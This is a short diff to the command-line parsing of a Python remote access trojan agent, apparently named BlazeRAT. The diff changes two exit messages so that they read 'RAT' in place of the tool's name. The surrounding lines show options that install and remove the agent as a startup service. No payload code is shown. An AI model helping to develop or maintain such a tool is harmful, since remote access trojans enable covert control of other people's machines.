@@ -103,7 +103,7 @@ def ParseArgs():
             out = ServiceInstall()
             exit(out)
         else:
-            exit("[!] BlazeRAT agent already installed!")
+            exit("[!] RAT agent already installed!")
 
     # Remove from startup:
     # Example: python3 main.py --UninstallAgent
@@ -112,7 +112,7 @@ def ParseArgs():
             out = ServiceUninstall()
             exit(out)
         else:
-            exit("[!] BlazeRAT not installed!")
+            exit("[!] RAT not installed!")
 
     # Get banned users list:
     # Example: python3 main.py --Banlist
